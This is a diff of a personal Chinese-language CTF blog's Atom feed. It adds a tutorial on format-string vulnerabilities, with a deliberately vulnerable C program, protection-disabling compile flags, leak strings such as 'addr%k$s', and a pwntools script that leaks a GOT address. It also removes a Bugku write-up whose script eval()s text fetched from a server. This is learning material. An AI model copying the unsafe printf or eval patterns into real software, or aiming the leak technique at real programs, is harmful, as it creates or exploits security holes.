@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>Cyurl3_BLOG</title>
-    <updated>2020-06-01T14:26:18.323Z</updated>
+    <updated>2020-06-06T09:42:29.831Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,63 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Cyurl3_BLOG</rights>
+    <entry>
+        <title type="html"><![CDATA[格式化字符串漏洞学习总结(未完)]]></title>
+        <id>https://zhangzy999.github.io/post/ge-shi-hua-zi-fu-chuan-lou-dong-xue-xi-zong-jie-wei-wan/</id>
+        <link href="https://zhangzy999.github.io/post/ge-shi-hua-zi-fu-chuan-lou-dong-xue-xi-zong-jie-wei-wan/">
+        </link>
+        <updated>2020-06-06T09:16:23.000Z</updated>
+        <content type="html"><![CDATA[<p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）</p>
+<h1 id="泄露内存">泄露内存</h1>
+<h2 id="泄露栈内存">泄露栈内存</h2>
+<p>关于栈内存的泄露比较简单，不多说了</p>
+<h3 id="获取栈变量的数值">获取栈变量的数值</h3>
+<h3 id="获取栈变量的字符串">获取栈变量的字符串</h3>
+<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
+<p>看实例程序</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf(&quot;%s&quot;, s);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
+  printf(s);     //这个地方显然有格式化字符串漏洞
+  return 0;
+}
+</code></pre>
+<p>编译一下</p>
+<pre><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+</code></pre>
+<p>泄露指定地址的方法：</p>
+<pre><code>addr%k$s
+</code></pre>
+<p>确定字符串为几个参数的方法：</p>
+<pre><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p
+</code></pre>
+<p>我们设置一个可访问的地址，用scanf@got来举例子拿到scanf的地址（一般不泄露printf函数的地址，自己实操一下即可）<br>
+第一步，拿到scanf@got的地址（可有可无）<br>
+<img src="https://zhangzy999.github.io//post-images/1591436467954.png" alt="" loading="lazy"><br>
+第二步，判断是<strong>格式化字符串</strong>的第几个参数<br>
+通过%p的那种形式可以判断出来是格式化字符串的第四个参数<br>
+<img src="https://zhangzy999.github.io//post-images/1591436474937.png" alt="" loading="lazy"><br>
+第三步，写payload</p>
+<pre><code class="language-python">from pwn import *
+
+filename = './format_string_1_leakmemory'
+sh = process(filename)
+elf = ELF(filename)
+
+scanf_got = elf.got['__libc_start_main']
+payload = p32(scanf_got) + '%4$s'
+
+sh.sendline(payload)
+
+sh.recvuntil('%4$s')
+print hex(u32(sh.recv()[4:8]))
+</code></pre>
+<p>然后就拿到了scanf的地址</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[攻防世界pwn新手区—int_overflow]]></title>
         <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/</id>
@@ -543,48 +600,6 @@ Ohhhh,上传成功辣<br>
 3，用图片的文件头来绕过exif_imagetype()函数的检测<br>
 本文的最后附上github上的题目项目8：<a href="https://github.com/team-su/SUCTF-2019/blob/master/Web/checkIn/src/html/index.php">题目环境</a><br>
 如有错误，b站私信up主”yuyu-宇“指出嗷~</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CTF—Bugku：秋名山老司机(快速反弹POST)—来一起开车鸭~]]></title>
-        <id>https://zhangzy999.github.io/post/qiumingshanlaosiji/</id>
-        <link href="https://zhangzy999.github.io/post/qiumingshanlaosiji/">
-        </link>
-        <updated>2020-05-07T03:28:12.000Z</updated>
-        <content type="html"><![CDATA[<p>封面小姐姐好看吧🤤<br>
-没错，本次题目和她……一点关系都没有……<br>
-无聊，博客太少了，于是乎随便做俩题写个wp来凑凑数（逃<br>
-这个题不算难——前提是你会python<br>
-咳咳，进入正题，我们打开页面，发现如下所示：<br>
-<img src="https://zhangzy999.github.io//post-images/1588822298727.PNG" alt="" loading="lazy"><br>
-页面啥都莫得，只有一句话：请在两秒内提交表达式的值<br>
-好吧，除非我是速算界的超级大脑和手速界的扛把子，要不然肯定做不到<br>
-分析下哈，提交的话，用什么办法提交？get？post？<br>
-当我再刷新两下页面的时候，就出现了一句提示<br>
-<img src="https://zhangzy999.github.io//post-images/1588822470508.PNG" alt="" loading="lazy"><br>
-嗯，很好，告诉我们用post提交，而且提示我们参数是value<br>
-那我们就上python吧<br>
-网上的wp大多是正则表达式，我就纳闷了，split方法不香吗   o.o  😑 (正则大佬请无视)<br>
-<img src="https://zhangzy999.github.io//post-images/1588822588012.PNG" alt="" loading="lazy"><br>
-上图是我用split方法进行调试的结果<br>
-好8，直接祭出改良版的脚本：（因为有时候数太大python计算好像会出现一定的精确度上的误差）<br>
-我选择了一个while循环来优化，看着也省心☠️<br>
-<img src="https://zhangzy999.github.io//post-images/1588822722154.PNG" alt="" loading="lazy"></p>
-<pre><code class="language-python">import requests
-while True:
-    url = 'http://123.206.87.240:8002/qiumingshan/'
-    s = requests.session()
-    r = s.get(url)
-    temp = r.text.split(&quot;div&gt;&quot;)[1].split('=')[0]  
-    flag = eval(temp)
-    data = {'value':flag}
-    response = s.post(url,data = data)
-    if &quot;Bug&quot; in response.text:
-        print response.text
-        break
-</code></pre>
-<p>然后就是flag辣<br>
-<img src="https://zhangzy999.github.io//post-images/1588822875045.PNG" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
